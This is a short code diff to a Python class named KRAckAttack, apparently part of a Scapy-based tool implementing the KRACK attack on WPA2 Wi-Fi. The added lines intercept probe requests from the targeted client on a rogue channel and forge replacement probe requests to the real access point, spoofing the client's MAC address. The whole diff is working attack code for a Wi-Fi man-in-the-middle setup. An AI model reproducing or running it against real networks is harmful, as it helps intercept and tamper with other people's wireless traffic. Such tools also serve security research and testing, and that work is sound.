@@ -487,7 +487,14 @@ class KRAckAttack():
 					print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
+				if (p.haslayer(Dot11ProbeReq)):
+					essid = Dot11Elt(ID='SSID', info=self.netconfig.ssid)
+					rates  = Dot11Elt(ID='Rates',info=self.rates)
+					dsset = Dot11Elt(ID='DSset',info=bytes([self.netconfig.real_channel]))
+					dot11 =  Dot11(type=0, subtype=4, addr1=self.apmac, addr2=self.clientmac, addr3=self.apmac)
+					np = dot11/Dot11ProbeReq()/essid/rates/dsset
+					self.sock_real.send(np, True, self.netconfig.real_channel)
+				# print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None:
